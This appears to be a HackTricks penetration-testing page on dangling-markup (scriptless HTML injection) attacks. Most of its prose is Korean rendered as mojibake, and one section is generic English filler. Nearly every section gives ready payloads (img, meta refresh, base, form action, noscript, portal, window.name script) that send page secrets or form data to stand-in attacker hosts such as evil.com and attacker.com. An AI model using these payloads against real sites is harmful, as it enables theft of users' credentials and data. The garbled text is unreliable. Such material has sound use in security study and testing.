# Dangling Markup - HTML scriptless injection

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ìš”ì•½

ì´ ê¸°ìˆ ì€ **HTML ì¸ì ì…˜ì´ ë°œê²¬**ë˜ì—ˆì„ ë•Œ ì‚¬ìš©ìë¡œë¶€í„° ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” [**XSS**](../xss-cross-site-scripting/)ë¥¼ **ì´ìš©í•  ë°©ë²•ì„ ì°¾ì§€ ëª»í–ˆì„ ë•Œ** ë§¤ìš° ìœ ìš©í•˜ë©°, **ì¼ë¶€ HTML íƒœê·¸ë¥¼ ì‚½ì…**í•  ìˆ˜ ìˆë‹¤ë©´ ë”ìš± ìœ ìš©í•©ë‹ˆë‹¤.\
ë˜í•œ, HTMLì— **ì•”í˜¸ê°€ í‰ë¬¸ìœ¼ë¡œ ì €ì¥**ë˜ì–´ ìˆê³  í´ë¼ì´ì–¸íŠ¸ë¡œë¶€í„° ì´ë¥¼ **ìœ ì¶œ**í•˜ê±°ë‚˜ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì„ í˜¼ë€ì‹œí‚¤ê³  ì‹¶ì„ ë•Œ ìœ ìš©í•©ë‹ˆë‹¤.

ì—¬ê¸°ì—ì„œ ì„¤ëª…í•˜ëŠ” ì—¬ëŸ¬ ê¸°ìˆ ì€ ì˜ˆìƒì¹˜ ëª»í•œ ë°©ì‹ìœ¼ë¡œ ì •ë³´ë¥¼ ìœ ì¶œí•¨ìœ¼ë¡œì¨ ì¼ë¶€ [**ì½˜í…ì¸  ë³´ì•ˆ ì •ì±…**](../content-security-policy-csp-bypass/)ì„ ìš°íšŒí•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (html íƒœê·¸, CSS, http-meta íƒœê·¸, í¼, base ë“±).

## ì£¼ìš” ì‘ìš© ë¶„ì•¼

### í‰ë¬¸ ë¹„ë°€ í›”ì¹˜ê¸°

í˜ì´ì§€ê°€ ë¡œë“œë  ë•Œ `<img src='http://evil.com/log.cgi?`ë¥¼ ì‚½ì…í•˜ë©´ í”¼í•´ìëŠ” ì‚½ì…ëœ `img` íƒœê·¸ì™€ ì½”ë“œ ë‚´ ë‹¤ìŒ ë”°ì˜´í‘œ ì‚¬ì´ì˜ ëª¨ë“  ì½”ë“œë¥¼ ë³´ë‚´ì¤ë‹ˆë‹¤. ë§Œì•½ ê·¸ ì²­í¬ì— ë¹„ë°€ì´ ìˆë‹¤ë©´, ê·¸ê²ƒì„ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë” í¥ë¯¸ë¡œìš¸ ìˆ˜ ìˆëŠ” ê²ƒì„ í™•ì¸í•˜ê¸° ìœ„í•´ ì´ì¤‘ ë”°ì˜´í‘œë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤).

`img` íƒœê·¸ê°€ ê¸ˆì§€ë˜ì–´ ìˆëŠ” ê²½ìš° (ì˜ˆ: CSP ë•Œë¬¸ì—) `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```

**ì°¸ê³ :** **Chromeì€** "<" ë˜ëŠ” "\n"ì„ í¬í•¨í•˜ëŠ” **HTTP URLì„ ì°¨ë‹¨**í•˜ë¯€ë¡œ "ftp"ì™€ ê°™ì€ ë‹¤ë¥¸ í”„ë¡œí† ì½œ ì²´ê³„ë¥¼ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

CSS `@import`ë¥¼ ë‚¨ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. (";"ì„ ì°¾ì„ ë•Œê¹Œì§€ ëª¨ë“  ì½”ë“œë¥¼ ì „ì†¡í•©ë‹ˆë‹¤.)

```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```

ë˜í•œ \*\*`<table`\*\*ì„ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```

ë‹¹ì‹ ì€ `<base` íƒœê·¸ë¥¼ ì‚½ì…í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ëª¨ë“  ì •ë³´ëŠ” ì¸ìš© ë¶€ë¶„ì´ ë‹«í ë•Œê¹Œì§€ ì „ì†¡ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŠ” ì‚¬ìš©ì ìƒí˜¸ì‘ìš©ì´ í•„ìš”í•©ë‹ˆë‹¤ (ì‚¬ìš©ìëŠ” ë§í¬ë¥¼ í´ë¦­í•´ì•¼ í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ base íƒœê·¸ê°€ ë§í¬ê°€ ê°€ë¦¬í‚¤ëŠ” ë„ë©”ì¸ì„ ë³€ê²½í–ˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤):

```html
<base target='        <--- Injected
steal me'<b>test</b>
```

### í¼ ë„ìš©

When performing a dangling markup attack, one of the possible objectives is to steal forms from a vulnerable website. This technique allows an attacker to inject malicious code into a website's HTML markup, which can then be used to capture sensitive information entered by users in the stolen forms.

To steal forms, the attacker needs to identify a vulnerable website that is susceptible to dangling markup injection. Once a vulnerable website is found, the attacker can inject their own HTML code into the website's markup. This injected code can be designed to mimic the appearance and functionality of the original form, tricking users into entering their sensitive information.

The injected code can include JavaScript that captures the form data entered by users and sends it to a remote server controlled by the attacker. This allows the attacker to collect usernames, passwords, credit card information, or any other sensitive data entered into the stolen forms.

To protect against this type of attack, website owners should implement proper input validation and sanitization techniques to prevent dangling markup injection vulnerabilities. Additionally, users should be cautious when entering sensitive information on websites and ensure that they are using secure connections (HTTPS) to protect their data from being intercepted.

By understanding how attackers can steal forms through dangling markup injection, website owners and users can take the necessary precautions to safeguard sensitive information and prevent unauthorized access to their data.

```html
<base href='http://evil.com/'>
```

ê·¸ëŸ¼, ê²½ë¡œë¡œ ë°ì´í„°ë¥¼ ë³´ë‚´ëŠ” í¼ (ì˜ˆ: `<form action='update_profile.php'>`)ì€ ì•…ì„± ë„ë©”ì¸ìœ¼ë¡œ ë°ì´í„°ë¥¼ ë³´ëƒ…ë‹ˆë‹¤.

### í¼ ë„ìš© 2

í¼ í—¤ë”ë¥¼ ì„¤ì •í•˜ì„¸ìš”: `<form action='http://evil.com/log_steal'>` ì´ë ‡ê²Œ í•˜ë©´ ë‹¤ìŒ í¼ í—¤ë”ê°€ ë®ì–´ì“°ì—¬ì§€ê³  í¼ì˜ ëª¨ë“  ë°ì´í„°ê°€ ê³µê²©ìì—ê²Œ ì „ì†¡ë©ë‹ˆë‹¤.

### í¼ ë„ìš© 3

ë²„íŠ¼ì€ "formaction" ì†ì„±ì„ ì‚¬ìš©í•˜ì—¬ í¼ì˜ ì •ë³´ê°€ ì „ì†¡ë  URLì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```

ê³µê²©ìëŠ” ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ë³´ë¥¼ ë„ë‚œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### í‰ë¬¸ ë¹„ë°€ í›”ì¹˜ê¸° 2

ì´ì „ì— ì–¸ê¸‰ëœ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ í¼ì„ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ìƒˆë¡œìš´ í¼ í—¤ë”ë¥¼ ì£¼ì…). ê·¸ëŸ° ë‹¤ìŒ ìƒˆë¡œìš´ ì…ë ¥ í•„ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```html
<input type='hidden' name='review_body' value="
```

ê·¸ë¦¬ê³  ì´ ì…ë ¥ í•„ë“œì—ëŠ” HTMLì—ì„œ ì²« ë²ˆì§¸ ì´ì¤‘ ì¸ìš©ë¶€í˜¸ì™€ ë‹¤ìŒ ì´ì¤‘ ì¸ìš©ë¶€í˜¸ ì‚¬ì´ì˜ ëª¨ë“  ë‚´ìš©ì´ í¬í•¨ë©ë‹ˆë‹¤. ì´ ê³µê²©ì€ "_**í‰ë¬¸ ë¹„ë°€ í›”ì¹˜ê¸°**_"ì™€ "_**ì–‘ì‹2 í›”ì¹˜ê¸°**_"ë¥¼ í˜¼í•©í•©ë‹ˆë‹¤.

ë™ì¼í•œ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì–‘ì‹ê³¼ `<option>` íƒœê·¸ë¥¼ ì‚½ì…í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë‹«íŒ `</option>`ì´ ë°œê²¬ë  ë•Œê¹Œì§€ì˜ ëª¨ë“  ë°ì´í„°ê°€ ì „ì†¡ë©ë‹ˆë‹¤:

```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```

### í¼ ë§¤ê°œë³€ìˆ˜ ì‚½ì…

í¼ì˜ ê²½ë¡œë¥¼ ë³€ê²½í•˜ê³  ìƒˆë¡œìš´ ê°’ì„ ì‚½ì…í•˜ì—¬ ì˜ˆìƒì¹˜ ëª»í•œ ë™ì‘ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```

### noscriptë¥¼ í†µí•œ í‰ë¬¸ ë¹„ë°€ ì •ë³´ ë„ë‚œ

`<noscript></noscript>`ëŠ” ë¸Œë¼ìš°ì €ê°€ ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§€ì›í•˜ì§€ ì•Šì„ ë•Œ í•´ì„ë˜ëŠ” íƒœê·¸ì…ë‹ˆë‹¤ (Chromeì—ì„œ ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ í™œì„±í™”/ë¹„í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [chrome://settings/content/javascript](chrome://settings/content/javascript)).

ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì‚¬ì´íŠ¸ë¡œ ì‚½ì… ì§€ì ë¶€í„° ì›¹ í˜ì´ì§€ì˜ ë‚´ìš©ì„ í•˜ë‹¨ê¹Œì§€ ìœ ì¶œí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ì´ ì‚½ì…í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:

```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```

### ì‚¬ìš©ì ìƒí˜¸ì‘ìš©ì„ í†µí•œ CSP ìš°íšŒ

[ì´ í¬íŠ¸ìŠ¤ìœ„ê±°ìŠ¤ ì—°êµ¬](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)ì—ì„œëŠ” ê°€ì¥ CSPê°€ ì œí•œëœ í™˜ê²½ì—ì„œë„ ì¼ë¶€ ì‚¬ìš©ì ìƒí˜¸ì‘ìš©ì„ í†µí•´ ë°ì´í„°ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë²ˆì—ëŠ” ë‹¤ìŒ payloadë¥¼ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤:

```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```

í”¼í•´ìì—ê²Œ **ë§í¬ë¥¼ í´ë¦­**í•˜ë„ë¡ ìš”ì²­í•˜ì—¬ ê·¸ë¥¼ **ë¦¬ë””ë ‰ì…˜**í•˜ì—¬ ë‹¹ì‹ ì´ ì œì–´í•˜ëŠ” **í˜ì´ë¡œë“œ**ë¡œ ì´ë™í•˜ê²Œ í•  ê²ƒì…ë‹ˆë‹¤. ë˜í•œ **`base`** íƒœê·¸ ë‚´ë¶€ì˜ **`target`** ì†ì„±ì€ ë‹¤ìŒ ì‘ì€ ë”°ì˜´í‘œê¹Œì§€ì˜ **HTML ì½˜í…ì¸ **ë¥¼ í¬í•¨í•  ê²ƒì…ë‹ˆë‹¤.\
ì´ë¡œ ì¸í•´ ë§í¬ê°€ í´ë¦­ë˜ë©´ \*\*`window.name`\*\*ì˜ **ê°’**ì€ í•´ë‹¹ **HTML ì½˜í…ì¸ **ê°€ ë  ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ë§í¬ë¥¼ í´ë¦­í•˜ì—¬ í”¼í•´ìê°€ ì ‘ê·¼í•˜ëŠ” í˜ì´ì§€ë¥¼ ì œì–´í•˜ë¯€ë¡œ í•´ë‹¹ \*\*`window.name`\*\*ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ ë°ì´í„°ë¥¼ **ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```

### ì˜ëª»ëœ ìŠ¤í¬ë¦½íŠ¸ ì›Œí¬í”Œë¡œìš° 1 - HTML ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê³µê²©

HTMLì— ìƒˆë¡œìš´ íƒœê·¸ë¥¼ ì‚½ì…í•˜ì—¬ ë‹¤ìŒ íƒœê·¸ë¥¼ ë®ì–´ì“°ê³ , ìŠ¤í¬ë¦½íŠ¸ì˜ íë¦„ì— ì˜í–¥ì„ ë¯¸ì¹  ê°’ì„ ì§€ì •í•©ë‹ˆë‹¤. ì´ ì˜ˆì‹œì—ì„œëŠ” ì •ë³´ë¥¼ ê³µìœ í•  ëŒ€ìƒì„ ì„ íƒí•©ë‹ˆë‹¤:

```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```

### ì˜ëª»ëœ ìŠ¤í¬ë¦½íŠ¸ ì›Œí¬í”Œë¡œìš° 2 - ìŠ¤í¬ë¦½íŠ¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê³µê²©

HTML íƒœê·¸ë¥¼ ì‚½ì…í•˜ì—¬ ìë°”ìŠ¤í¬ë¦½íŠ¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì— ë³€ìˆ˜ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ì´ ë³€ìˆ˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ íë¦„ì— ì˜í–¥ì„ ë¯¸ì¹  ê²ƒì…ë‹ˆë‹¤:

```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```

### JSONPì˜ ë‚¨ìš©

JSONP ì¸í„°í˜ì´ìŠ¤ë¥¼ ë°œê²¬í•˜ë©´ ì„ì˜ì˜ í•¨ìˆ˜ì™€ ì„ì˜ì˜ ë°ì´í„°ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```

ë˜ëŠ” ì¼ë¶€ JavaScriptë¥¼ ì‹¤í–‰í•´ ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

```html
<script src='/search?q=a&call=alert(1)'></script>
```

### Iframe ë‚¨ìš©

ìì‹ ë¬¸ì„œëŠ” ë¶€ëª¨ì˜ `location` ì†ì„±ì„ ë³´ê³  ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì„ ê°–ê³  ìˆìœ¼ë©°, êµì°¨ ì¶œì²˜ ìƒí™©ì—ì„œë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ëŠ” **iframe** ë‚´ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•˜ì—¬ í´ë¼ì´ì–¸íŠ¸ë¥¼ ì„ì˜ì˜ í˜ì´ì§€ë¡œ ë¦¬ë””ë ‰ì…˜í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤:

```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```

ë‹¤ìŒê³¼ ê°™ì´ ì´ë¥¼ ì™„í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `sandbox=' allow-scripts allow-top-navigation'`

ë˜í•œ, iframeì€ **iframe name ì†ì„±ì„ ì‚¬ìš©í•˜ì—¬** ë‹¤ë¥¸ í˜ì´ì§€ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ìœ ì¶œì‹œí‚¬ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì´ˆê¸° iframeì—ì„œ í•´ë‹¹ ì´ë¦„ì„ ì•¡ì„¸ìŠ¤í•˜ì—¬ ìœ ì¶œí•˜ê¸° ìœ„í•´ HTML ì‚½ì…ì„ ì•…ìš©í•˜ì—¬ ìì²´ì ìœ¼ë¡œ iframeì„ ë§Œë“¤ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— **ë¯¼ê°í•œ ì •ë³´ê°€ iframe name ì†ì„± ë‚´ì— í‘œì‹œ**ë©ë‹ˆë‹¤.

```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```

ë” ë§ì€ ì •ë³´ëŠ” [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### \<meta ë‚¨ìš©

\*\*`meta http-equiv`\*\*ë¥¼ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ Cookieë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ë˜ëŠ” ë¦¬ë””ë ‰ì…˜ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì´ ê²½ìš° 5ì´ˆ í›„ì—): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

ì´ëŠ” **CSP**ë¥¼ ì‚¬ìš©í•˜ì—¬ **http-equiv**ë¥¼ í†µí•´ íšŒí”¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (`Content-Security-Policy: default-src 'self';`, ë˜ëŠ” `Content-Security-Policy: http-equiv 'self';`)

### ìƒˆë¡œìš´ \<portal HTML íƒœê·¸

\<portal íƒœê·¸ì˜ ì·¨ì•½ì ì— ëŒ€í•œ ë§¤ìš° **í¥ë¯¸ë¡œìš´ ì—°êµ¬**ë¥¼ [ì—¬ê¸°](https://research.securitum.com/security-analysis-of-portal-element/)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ê¸€ì„ ì‘ì„±í•˜ëŠ” ì‹œì ì—ì„œ Chromeì—ì„œ \<portal íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ `chrome://flags/#enable-portals`ì—ì„œ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

```html
<portal src='https://attacker-server?
```

### HTML ëˆ„ì¶œ

HTMLì—ì„œ ì—°ê²°ì„±ì„ ëˆ„ì¶œì‹œí‚¤ëŠ” ë°©ë²• ì¤‘ ì¼ë¶€ëŠ” Dangling Markupì— ìœ ìš©í•˜ì§€ ì•Šì„ ìˆ˜ ìˆì§€ë§Œ, ë•Œë¡œëŠ” ë„ì›€ì´ ë  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

ì´ê²ƒì€ **dangling markupê³¼ XS-Leaksì˜ í˜¼í•©**ì…ë‹ˆë‹¤. í•œìª½ì—ì„œëŠ” ì·¨ì•½ì ì´ **HTMLì„ ì£¼ì…**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤(í•˜ì§€ë§Œ JSëŠ” ì•„ë‹™ë‹ˆë‹¤). ìš°ë¦¬ê°€ ê³µê²©í•  í˜ì´ì§€ì˜ **ë™ì¼ ì¶œì²˜**ì— ìˆëŠ” í˜ì´ì§€ì—. ë‹¤ë¥¸ í•œí¸ì—ì„œëŠ” ìš°ë¦¬ê°€ HTMLì„ ì£¼ì…í•  ìˆ˜ ìˆëŠ” í˜ì´ì§€ë¥¼ ì§ì ‘ **ê³µê²©í•˜ì§€ ì•Šê³  ë‹¤ë¥¸ í˜ì´ì§€**ë¥¼ ê³µê²©í•©ë‹ˆë‹¤.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-SearchëŠ” **ì‚¬ì´ë“œ ì±„ë„ ê³µê²©ì„ ì•…ìš©í•˜ì—¬ êµì°¨ ì¶œì²˜ ì •ë³´ë¥¼ ìœ ì¶œ**í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•©ë‹ˆë‹¤. ë”°ë¼ì„œ Dangling Markupê³¼ëŠ” ë‹¤ë¥¸ ê¸°ìˆ ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì¼ë¶€ ê¸°ìˆ ì€ HTML íƒœê·¸ì˜ í¬í•¨ì„ ì•…ìš©í•©ë‹ˆë‹¤(JavaScript ì‹¤í–‰ ì—¬ë¶€ì— ë”°ë¼ í¬í•¨ë˜ê±°ë‚˜ í¬í•¨ë˜ì§€ ì•ŠìŒ), ì˜ˆë¥¼ ë“¤ì–´ [**CSS Injection**](../xs-search/#css-injection) ë˜ëŠ” [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## ë¸Œë£¨íŠ¸ í¬ìŠ¤ íƒì§€ ëª©ë¡

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## ì°¸ê³  ìë£Œ

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricksì™€ HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
